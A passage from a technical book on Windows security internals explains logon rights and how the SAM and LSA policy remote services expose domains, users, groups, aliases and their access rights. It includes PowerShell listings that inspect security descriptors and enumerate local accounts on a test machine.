<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeDenyServiceLogonRight</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">Authenticate for a service process.</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeRemoteInteractiveLogonRight</samp></p></td>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeDenyRemoteInteractiveLogonRight</samp></p></td>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">Authenticate to interact with a remote desktop.</samp></p></td>
</tr>
</tbody>
</table>
<p class="TX">If a user or group is not assigned a logon right, they won’t be granted permission to authenticate in that role. For example, if a user who is not granted <samp class="SANS_TheSansMonoCd_W5Regular_11">SeInteractiveLogonRight</samp> attempts to authenticate to the physical console, they’ll be denied access. However, if they are granted <samp class="SANS_TheSansMonoCd_W5Regular_11">SeNetworkLogonRight</samp>, the user might still be able to connect to the Windows system over the network to access a file share and authenticate successfully. The deny rights are inspected before the allow rights, so you can allow a general group, such as <i>Users</i>, and then deny specific accounts.</p>
<p class="TX">The PowerShell module also provides commands to modify the user rights assignment. You can add a SID to an account right using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Add-NtAccountRight</samp> command. To remove a SID, use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Remove-NtAccountRight</samp> command. We’ll see examples of how to use these commands in <span class="Xref"><a href="chapter12.xhtml">Chapter 12</a></span>.</p>
</section>
</section>
<section aria-labelledby="sec10" epub:type="division">
<h3 class="H1" id="sec10"><span id="h1-77"></span><samp class="SANS_Futura_Std_Bold_B_11">Remote LSA Services</samp></h3>
<p class="TNI1">The previous section demonstrated communicating with the LSA on the local system and extracting information from its configuration databases in PowerShell using commands such as <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalUser</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtAccountRight</samp>. I previously described the mechanisms used to access this information as a single set of local APIs, but it’s actually a lot more complicated than that. <a href="chapter10.xhtml#fig10-6">Figure 10-6</a> shows how the two local domain configuration databases are exposed to an application such as PowerShell.</p>
<span aria-label=" Page 312. " epub:type="pagebreak" id="pg_312" role="doc-pagebreak"></span>
<figure class="IMG"><img alt="" class="img1" height="685" id="fig10-6" src="../images/Figure10-6.jpg" width="1368"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 10-6: The LSA’s remote services and objects</samp></p></figcaption>
</figure>
<p class="TX">Consider the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalUser</samp> command, which calls a Win32 API to enumerate the local users. The user database is stored in the <i>security account manager (SAM) database</i> and is accessed using the <i>SAM remote service</i>. To enumerate the list of users in the local SAM database, an application must first request access to a domain object. From that domain object, the API can query the user list, or different APIs could enumerate local groups or aliases instead.</p>
<p class="TX">On the other hand, the LSA policy database is stored in the SECURITY database, and to access it, we use the <i>domain policy remote service</i>.</p>
<p class="TX">While the network protocols used to access the SAM and SECURITY databases are different, they share a couple of common idioms:</p>
<ul class="ul">
<li class="ListBullet">The client initially requests a connection to the database.</li>
<li class="ListBullet">Once connected, the client can request access to individual objects, such as domains or users.</li>
<li class="ListBullet">The database and objects have configured security descriptors used to control access.</li>
</ul>
<p class="TX">The PowerShell commands interact with the local LSA, but the same network protocol could be used to query the LSA on another machine in an enterprise network. To get a better understanding of how the database access works, we need to use the low-level APIs to drive the protocol, as the higher-level APIs used by commands such as <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalUser</samp> hide much of the complexity and structure. The following sections discuss how you can access the databases directly to inspect their security information and configuration.</p>
<section aria-labelledby="sec11" epub:type="division">
<h4 class="H2" id="sec11"><span id="h2-98"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">The SAM Remote Service</samp></h4>
<p class="TNI1">Microsoft documents the service used to access the SAM in the <i>MS-SAMR</i> document, which is available online. Luckily, however, we don’t need to reimplement this protocol ourselves. We can make a connection to the SAM <span aria-label=" Page 313. " epub:type="pagebreak" id="pg_313" role="doc-pagebreak"></span>using the <samp class="SANS_TheSansMonoCd_W5Regular_11">SamConnect</samp> Win32 API, which returns a handle we can use for subsequent requests.</p>
<p class="TX">In <a href="chapter10.xhtml#Lis10-9">Listing 10-9</a>, we make a connection to the SAM using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Connect-SamServer</samp> command, which exposes the <samp class="SANS_TheSansMonoCd_W5Regular_11">SamConnect</samp> API.</p>
<span id="Lis10-9"></span><pre><code>PS&gt; <b>$server = Connect-SamServer -ServerName 'localhost'</b>
PS&gt; <b>Format-NtSecurityDescriptor $server -Summary -MapGeneric</b>
&lt;Owner&gt; : BUILTIN\Administrators
&lt;Group&gt; : BUILTIN\Administrators
&lt;DACL&gt;
Everyone: (Allowed)(None)(Connect|EnumerateDomains|LookupDomain|ReadControl)
BUILTIN\Administrators: (Allowed)(None)(Full Access)
NAMED CAPABILITIES\User Signin Support: (Allowed)(None)(GenericExecute|GenericRead)
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-9: Connecting to the SAM and displaying its security descriptor</span></p>
<p class="TX">You can specify the name of the server containing the SAM using the <samp class="SANS_TheSansMonoCd_W5Regular_11">ServerName</samp> property. In this case, we use <i>localhost</i> (for clarity; specifying this value is redundant, as it’s the default for the command). The connection has an associated security descriptor that we query using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Format-NtSecurityDescriptor</samp> command introduced in <span class="Xref"><a href="chapter5.xhtml">Chapter 5</a></span>.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>In <a href="chapter6.xhtml">Chapter 6</a> we discussed using the <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">Set-NtSecurityDescriptor</samp> command to modify a security descriptor. You could use this to grant other users access to the SAM, but doing so is not recommended; if done incorrectly, it could grant a low-privileged user SAM access, which could lead to an elevation of privileges or even a remote compromise of the Windows system.</i></p>
</blockquote>
<p class="TX">You can request specific access rights on the connection with the <samp class="SANS_TheSansMonoCd_W5Regular_11">Access</samp> parameter. If it’s not specified (as was the case in <a href="chapter10.xhtml#Lis10-9">Listing 10-9</a>), the command will request the maximum allowed access. The following are the defined access rights for the SAM server connection:</p>
<p class="RunInPara1"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">Connect  </samp>Enables connecting to the SAM server</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">Shutdown</samp><samp class="SANS_TheSansMonoCd_W7Bold_B_11">  </samp>Enables shutting down the SAM server</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">Initialize  </samp>Enables initializing the SAM database</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">CreateDomain  </samp>Enables creating a new domain in the SAM database</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">EnumerateDomains  </samp>Enables enumerating domains in the SAM database</p>
<p class="RunInPara2"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">LookupDomain  </samp>Enables looking up a domain’s information from the SAM database</p>
<p class="TX">To connect to the SAM server, the security descriptor must grant the caller the <samp class="SANS_TheSansMonoCd_W5Regular_11">Connect</samp> access right. The <samp class="SANS_TheSansMonoCd_W5Regular_11">Shutdown</samp>, <samp class="SANS_TheSansMonoCd_W5Regular_11">Initialize</samp>, and <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateDomain</samp> access rights were defined for operations no longer supported by the SAM service.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>The default configuration allows only users who are members of the computer’s local</i> <span class="note_Italic">Administrators</span> <i>group to access the SAM remotely. If the caller is not a local administrator, access will be denied, regardless of the security descriptor configuration on the SAM. Windows 10 introduced this additional restriction to make it harder for</i> <span aria-label=" Page 314. " epub:type="pagebreak" id="pg_314" role="doc-pagebreak"></span><i>malicious users to enumerate local users and groups on domain-joined systems or exploit weak security configurations. It does not apply to domain controllers or when accessing the SAM locally.</i></p>
</blockquote>
<section aria-labelledby="sec12" epub:type="division">
<h5 class="H3" id="sec12"><span id="h3-19"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Domain Objects</samp></h5>
<p class="TNI1">A <i>domain object</i> is a securable resource exposed by the SAM. The <samp class="SANS_TheSansMonoCd_W5Regular_11">EnumerateDomains</samp> access right on the connection allows you to enumerate the names of the domains in the SAM database, while <samp class="SANS_TheSansMonoCd_W5Regular_11">LookupDomain</samp> allows you to convert those names to SIDs, which are required to open a domain object using the <samp class="SANS_TheSansMonoCd_W5Regular_11">SamOpenDomain</samp> API.</p>
<p class="TX">PowerShell implements this API in the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamDomain</samp> command. In <a href="chapter10.xhtml#Lis10-10">Listing 10-10</a>, we use it to inspect the domain configuration in the SAM database.</p>
<span id="Lis10-10"></span><pre><code>PS&gt; <b>Get-SamDomain -Server $server -InfoOnly</b>
Name     DomainId
----     --------
GRAPHITE S-1-5-21-2318445812-3516008893-216915059
Builtin  S-1-5-32

PS&gt; <b>$domain = Get-SamDomain -Server $server -Name "$env:COMPUTERNAME"</b>
PS&gt; <b>$domain.PasswordInformation</b>
MinimumLength : 7
HistoryLength : 24
Properties    : Complex
MaximumAge    : 42.00:00:00
MinimumAge    : 1.00:00:00
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-10: Enumerating and opening domains</span></p>
<p class="TX">We start by enumerating the domains accessible to the SAM. Because we use the <samp class="SANS_TheSansMonoCd_W5Regular_11">InfoOnly</samp> parameter, this command won’t open any domain objects; it will just return the names and domain SIDs. We’re querying a workstation, so the first entry is the local workstation name, in this case <i>GRAPHITE</i>, and the local machine SID. The second is the built-in domain, which contains groups such as <i>BUILTIN\Administrators</i>.</p>
<p class="TX">Note that if the domains being enumerated are on a domain controller, the SAM service doesn’t query a local SAM database. Instead, the service accesses the user data from Active Directory. In this case, the whole domain replaces the local domain object; it’s not possible to directly query local users on a domain controller. We’ll see in <span class="Xref"><a href="chapter11.xhtml">Chapter 11</a></span> how to access the same information using native network protocols for Active Directory.</p>
<p class="TX">We can use the same command to open a domain object directory by specifying its name or SID. In this case, we choose to use the name. As the domain is a securable object, you can specify the specific access rights with which to open the domain object from the following list:</p>
<p class="RunInPara1"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadPasswordParameters</samp><samp class="SANS_TheSansMonoCd_W7Bold_B_11">  </samp>Enables reading password parameters (such as the policy)</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">WritePasswordParams  </samp>Enables writing password parameters</p>
<p class="RunInPara"><span aria-label=" Page 315. " epub:type="pagebreak" id="pg_315" role="doc-pagebreak"></span><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadOtherParameters  </samp>Enables reading general domain information</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">WriteOtherParameters  </samp>Enables writing general domain information</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">CreateUser  </samp>Enables creating a new user</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">CreateGroup  </samp>Enables creating a new group</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">CreateAlias  </samp>Enables creating a new alias</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">GetAliasMembership  </samp>Enables getting the membership of an alias</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ListAccounts  </samp>Enables enumerating users, groups, or aliases in the domain</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">Lookup  </samp>Enables looking up names or IDs of users, groups, or aliases</p>
<p class="RunInPara2"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AdministerServer</samp><samp class="SANS_TheSansMonoCd_W7Bold_B_11">  </samp>Enables changing the domain configuration, such as for domain replication</p>
<p class="TX">With the appropriate access, you can read or write properties of the domain object. For example, if you’ve been granted <samp class="SANS_TheSansMonoCd_W5Regular_11">ReadPasswordParameters</samp> access, you can query the password policy for the domain using the <samp class="SANS_TheSansMonoCd_W5Regular_11">PasswordInformation</samp> property, as we did in <a href="chapter10.xhtml#Lis10-10">Listing 10-10</a>.</p>
<p class="TX">If you’ve been granted the <samp class="SANS_TheSansMonoCd_W5Regular_11">ListAccounts</samp> access right, you can also use the domain object to enumerate three other types of resources: users, groups, and aliases. We’ll look at each of these in turn in the following sections.</p>
</section>
<section aria-labelledby="sec13" epub:type="division">
<h5 class="H3" id="sec13"><span id="h3-20"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">User Objects</samp></h5>
<p class="TNI1">A <i>user object</i> represents what you’d expect: a local user account. You can open a user object with the <samp class="SANS_TheSansMonoCd_W5Regular_11">SamOpenUser</samp> API or the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamUser</samp> PowerShell command. <a href="chapter10.xhtml#Lis10-11">Listing 10-11</a> shows how to enumerate users in the domain using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamUser</samp> command.</p>
<span id="Lis10-11"></span><pre><code>PS&gt; <b>Get-SamUser -Domain $domain -InfoOnly</b>
Name               Sid
----               ---
admin              S-1-5-21-2318445812-3516008893-216915059-1001
Administrator      S-1-5-21-2318445812-3516008893-216915059-500
DefaultAccount     S-1-5-21-2318445812-3516008893-216915059-503
Guest              S-1-5-21-2318445812-3516008893-216915059-501
user               S-1-5-21-2318445812-3516008893-216915059-1002
WDAGUtilityAccount S-1-5-21-2318445812-3516008893-216915059-504

<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$user = Get-SamUser -Domain $domain -Name "WDAGUtilityAccount"</b>
PS&gt; <b>$user.UserAccountControl</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> AccountDisabled, NormalAccount
PS&gt; <b>Format-NtSecurityDescriptor $user -Summary</b>
&lt;Owner&gt; : BUILTIN\Administrators
&lt;Group&gt; : BUILTIN\Administrators
&lt;DACL&gt;
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> Everyone: (Allowed)(None)(ReadGeneral|ReadPreferences|ReadLogon|ReadAccount|
ChangePassword|ListGroups|ReadGroupInformation|ReadControl)
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> BUILTIN\Administrators: (Allowed)(None)(Full Access)
GRAPHITE\WDAGUtilityAccount: (Allowed)(None)(WritePreferences|ChangePassword|
ReadControl)
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-11: Enumerating users in the domain</span></p>
<p class="TX"><span aria-label=" Page 316. " epub:type="pagebreak" id="pg_316" role="doc-pagebreak"></span>The list of usernames and SIDs returned here should match the output from <a href="chapter10.xhtml#Lis10-1">Listing 10-1</a>, where we used the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalUser</samp> command. To get more information about a user, you need to open the user object <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>.</p>
<p class="TX">One property you can query on the opened user is the list of User Account Control flags. These flags define various properties of the user. In this case, as we’ve opened the <i>WDAGUtilityAccount</i> user, we find that it has the <samp class="SANS_TheSansMonoCd_W5Regular_11">AccountDisabled</samp> flag set <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. This matches the output in <a href="chapter10.xhtml#Lis10-1">Listing 10-1</a>, which had the <samp class="SANS_TheSansMonoCd_W5Regular_11">Enabled</samp> value set to <samp class="SANS_TheSansMonoCd_W5Regular_11">False</samp> for this user account.</p>
<p class="TX">As with the connection and the domain, each user object can have its own security descriptor configured. These can grant the following access rights:</p>
<p class="RunInPara1"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadGeneral  </samp>Enables reading general properties; for example, the username and full name properties</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadPreferences  </samp>Enables reading preferences; for example, the user’s text code page preference</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">WritePreferences  </samp>Enables writing preferences; for example, the user’s text code page preference</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadLogon  </samp>Enables reading the logon configuration and statistics; for example, the last logon time</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadAccount  </samp>Enables reading the account configuration; for example, the user account control flags</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">WriteAccount  </samp>Enables writing the account configuration; for example, the user account control flags</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ChangePassword  </samp>Enables changing the user’s password</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ForcePasswordChange  </samp>Enables force-changing a user’s password</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ListGroups  </samp>Enables listing the user’s group memberships</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadGroupInformation</samp><samp class="SANS_TheSansMonoCd_W7Bold_B_11">  </samp>Currently unused</p>
<p class="RunInPara2"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">WriteGroupInformation  </samp>Currently unused</p>
<p class="TX">Perhaps the most interesting of these access rights are <samp class="SANS_TheSansMonoCd_W5Regular_11">ChangePassword</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">ForcePasswordChange</samp>. The first allows the user’s password to be changed using an API like <samp class="SANS_TheSansMonoCd_W5Regular_11">SamChangePassword</samp>. For this to succeed, the caller must provide the old password along with the new password to set. If the old password doesn’t match the one that’s currently set, the server rejects the change request. You can see in <a href="chapter10.xhtml#Lis10-11">Listing 10-11</a> that the <i>Everyone</i> group <span aria-label="annotation3" class="CodeAnnotationCode">❸</span> and the <i>WDAGUtilityAccount</i> user are granted the <samp class="SANS_TheSansMonoCd_W5Regular_11">ChangePassword</samp> access right.</p>
<p class="TX">However, there are circumstances where an administrator might need to be able to change a user’s password even if they don’t know the previous password (if the user has forgotten it, for example). A caller who is granted <samp class="SANS_TheSansMonoCd_W5Regular_11">ForcePasswordChange</samp> access on the user object can assign a new one without needing to know the old password. In this case the password is set using the <samp class="SANS_TheSansMonoCd_W5Regular_11">SamSetInformationUser</samp> API. In <a href="chapter10.xhtml#Lis10-11">Listing 10-11</a>, only the <i>Administrators</i> group is granted <samp class="SANS_TheSansMonoCd_W5Regular_11">ForcePasswordChange</samp> access <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>.</p>
</section>
<section aria-labelledby="sec14" epub:type="division">
<h5 class="H3" id="sec14"><span id="h3-21"></span><span aria-label=" Page 317. " epub:type="pagebreak" id="pg_317" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Group Objects</samp></h5>
<p class="TNI1"><i>Group objects</i> configure the group membership of a user’s token when it’s created. We can enumerate the groups in a domain using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamGroup</samp> command and the members of a group using <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamGroupMember</samp>, as shown in <a href="chapter10.xhtml#Lis10-12">Listing 10-12</a>.</p>
<span id="Lis10-12"></span><pre><code>PS&gt; <b>Get-SamGroup -Domain $domain -InfoOnly</b>
Name Sid
---- ---
None S-1-5-21-2318445812-3516008893-216915059-513
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$group = Get-SamGroup $domain -Name "None"</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>Get-SamGroupMember -Group $group</b>
RelativeId                           Attributes
----------                           ----------
       500 Mandatory, EnabledByDefault, Enabled
       501 Mandatory, EnabledByDefault, Enabled
       503 Mandatory, EnabledByDefault, Enabled
       504 Mandatory, EnabledByDefault, Enabled
      1001 Mandatory, EnabledByDefault, Enabled
      1002 Mandatory, EnabledByDefault, Enabled
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-12: Listing domain group objects and enumerating members</span></p>
<p class="TX">The output of this command might surprise you. Where are the rest of the groups we saw in <a href="chapter10.xhtml#Lis10-4">Listing 10-4</a> as the output of the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalGroup</samp> command? Also, if you check that earlier output, you won’t find the <i>None</i> group, even though we see it returned here. What’s going on?</p>
<p class="TX">First, the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalGroup</samp> command returns groups in both the local domain and the separate <i>BUILTIN</i> domain. In <a href="chapter10.xhtml#Lis10-12">Listing 10-12</a>, we’re looking at only the local domain, so we wouldn’t expect to see a group such as <i>BUILTIN\Administrators</i>.</p>
<p class="TX">Second, the <samp class="SANS_TheSansMonoCd_W5Regular_11">None</samp> group is hidden from view by the higher-level APIs used by the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalGroup</samp> command, as it’s not really a group you’re supposed to modify. It’s managed by the LSA, which adds new members automatically when new users are created. If we list the members by opening the group <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> and using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamGroupMember</samp> command <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, we see that the members are stored as the user’s relative ID along with group attributes.</p>
<p class="TX">Note that the group doesn’t store the whole SID. This means a group can contain members in the same domain only, which severely limits their use. This is why the higher-level APIs don’t expose an easy way to manipulate them.</p>
<p class="TX">Interestingly, the default security descriptor for a domain object doesn’t grant anyone the <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateGroup</samp> access right, which allows for new groups to be created. Windows really doesn’t want you using group objects (although, if you really wanted to, you could change the security descriptor manually as an administrator to allow group creation to succeed).</p>
</section>
<section aria-labelledby="sec15" epub:type="division">
<h5 class="H3" id="sec15"><span id="h3-22"></span><span aria-label=" Page 318. " epub:type="pagebreak" id="pg_318" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Alias Objects</samp></h5>
<p class="TNI1">The final object type is the <i>alias object</i>. These objects represent the groups you’re more familiar with, as they’re the underlying type returned by the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalGroup</samp> command. For example, the <i>BUILTIN</i> domain object has aliases for groups such as <i>BUILTIN\Administrators</i>, which is used only on the local Windows system.</p>
<p class="TX">As <a href="chapter10.xhtml#Lis10-13">Listing 10-13</a> demonstrates, we can enumerate the aliases in a domain with the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamAlias</samp> command and query its members with <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamAliasMember</samp>.</p>
<span id="Lis10-13"></span><pre><code>PS&gt; <b>Get-SamAlias -Domain $domain -InfoOnly</b>
Name          Sid
----          ---
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> Awesome Users S-1-5-21-1653919079-861867932-2690720175-101

<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>$alias = Get-SamAlias -Domain $domain -Name "Awesome Users"</b>
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>Get-SamAliasMember -Alias $alias</b>
Name                     Sid
----                     ---
NT AUTHORITY\INTERACTIVE S-1-5-4
GRAPHITE\admin           S-1-5-21-2318445812-3516008893-216915059-1001
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-13: Listing domain alias objects and enumerating members</span></p>
<p class="TX">In this case, the only alias in the local domain is <i>Awesome Users</i> <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. To see a list of its members, we can open the alias by name <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> and use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-SamAliasMember</samp> command <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. Note that the entire SID is stored for each member, which means that (unlike with groups) the members of an alias can be from different domains. This makes aliases much more useful as a grouping mechanism and is likely why Windows does its best to hide the group objects from view.</p>
<p class="TX">Group and alias objects support the same access rights, although the raw access mask values differ. You can request the following types of access on both kinds of objects:</p>
<p class="RunInPara1"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AddMember  </samp>Enables adding a new member to the object</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">RemoveMember  </samp>Enables removing a member from the object</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ListMembers  </samp>Enables listing members of the object</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ReadInformation  </samp>Enables reading properties of the object</p>
<p class="RunInPara2"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">WriteAccount  </samp>Enables writing properties of the object</p>
<p class="TX">This concludes our discussion of the SAM remote service. Let’s now take a quick look at the second remote service, which allows you to access the domain policy.</p>
</section>
</section>
<section aria-labelledby="sec16" epub:type="division">
<h4 class="H2" id="sec16"><span id="h2-99"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">The Domain Policy Remote Service</samp></h4>
<p class="TNI1">Microsoft documents the protocol used to access the LSA policy (and thus the SECURITY database) in <i>MS-LSAD</i>. We can make a connection to the LSA policy using the <samp class="SANS_TheSansMonoCd_W5Regular_11">LsaOpenPolicy</samp> Win32 API, which returns a handle for <span aria-label=" Page 319. " epub:type="pagebreak" id="pg_319" role="doc-pagebreak"></span>subsequent calls. PowerShell exposes this API with the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LsaPolicy</samp> command, as demonstrated in <a href="chapter10.xhtml#Lis10-14">Listing 10-14</a>.</p>
<span id="Lis10-14"></span><pre><code>PS&gt; <b>$policy = Get-LsaPolicy</b>
PS&gt; <b>Format-NtSecurityDescriptor $policy -Summary</b>
&lt;Owner&gt; : BUILTIN\Administrators
&lt;Group&gt; : NT AUTHORITY\SYSTEM
&lt;DACL&gt;
NT AUTHORITY\ANONYMOUS LOGON: (Denied)(None)(LookupNames)
BUILTIN\Administrators: (Allowed)(None)(Full Access)
Everyone: (Allowed)(None)(ViewLocalInformation|LookupNames|ReadControl)
NT AUTHORITY\ANONYMOUS LOGON: (Allowed)(None)(ViewLocalInformation|LookupNames)
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-14: Opening the LSA policy, querying its security descriptor, and looking up a SID</span></p>
<p class="TX">First, we open the LSA policy on the local system. You can use the <samp class="SANS_TheSansMonoCd_W5Regular_11">SystemName</samp> parameter to specify the system to access if it’s not the local system. The LSA policy is a securable object, and we can query its security descriptor as shown here, assuming we have <samp class="SANS_TheSansMonoCd_W5Regular_11">ReadControl</samp> access.</p>
<p class="TX">You can specify one or more of the following access rights for the open policy by using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Access</samp> parameter when calling the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LsaPolicy</samp> command:</p>
<p class="RunInPara1"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ViewLocalInformation  </samp>Enables viewing policy information</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ViewAuditInformation  </samp>Enables viewing audit information</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">GetPrivateInformation  </samp>Enables viewing private information</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">TrustAdmin  </samp>Enables managing the domain trust configuration</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">CreateAccount  </samp>Enables creating a new account object</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">CreateSecret  </samp>Enables creating a new secret object</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">CreatePrivilege  </samp>Enables creating a new privilege (unsupported)</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">SetDefaultQuotaLimits  </samp>Enables setting default quota limits (unsupported)</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">SetAuditRequirements  </samp>Enables setting the audit event configuration</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AuditLogAdmin  </samp>Enables managing the audit log</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">ServerAdmin  </samp>Enables managing the server configuration</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">LookupNames  </samp>Enables looking up SIDs or names of accounts</p>
<p class="RunInPara2"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">Notification  </samp>Enables receiving notifications of policy changes</p>
<p class="TX">With the policy object and the appropriate access rights, you can manage the server’s configuration. You can also look up and open the three types of objects in the SECURITY database shown in <a href="chapter10.xhtml#fig10-6">Figure 10-6</a>: accounts, secrets, and trusted domains. The following sections describe these objects.</p>
<section aria-labelledby="sec17" epub:type="division">
<h5 class="H3" id="sec17"><span id="h3-23"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Account Objects</samp></h5>
